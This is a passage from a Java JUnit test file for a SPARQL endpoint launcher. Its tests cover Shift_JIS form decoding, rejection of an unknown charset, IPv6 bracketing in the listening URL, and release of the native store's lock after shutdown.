                "query=SELECT+%28%22%83e%83X%83g%22+AS+%3Fx%29+WHERE+%7B%7D", "text/csv");
        assertEquals(200, sjis.statusCode(), sjis.body());
        assertTrue(sjis.body().contains("テスト"), sjis.body());
        var unknown = post(shared.url(), "application/x-www-form-urlencoded; charset=no-such-charset", "query=ASK%7B%7D", null);
        assertEquals(415, unknown.statusCode(), unknown.body());
    }

    @Test
    void listeningUrlBracketsIpv6() {
        assertEquals("http://[::1]:8089/sparql", SparqlEndpointLauncher.listeningUrl("::1", 8089, "/sparql"));
        assertEquals("http://[::1]:8089/sparql", SparqlEndpointLauncher.listeningUrl("[::1]", 8089, "/sparql"));
        assertEquals("http://127.0.0.1:1/q", SparqlEndpointLauncher.listeningUrl("127.0.0.1", 1, "/q"));
    }

    @Test
    void nativeStoreIsReleasedAfterShutdown(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        for (int run = 0; run < 2; run++) {   // a second open of the same directory needs the lock released
            var store = SparqlEndpointLauncher.openNativeStore(dir.toString());
            CQELSEngine engine = SparqlEndpointLauncher.buildEngine(store);
            engine.start();
            engine.close();
            store.shutDown();
            assertFalse(store.isInitialized());
        }
    }

    @SuppressWarnings("unused")
    private static void silence(IOException ignored) { }
}
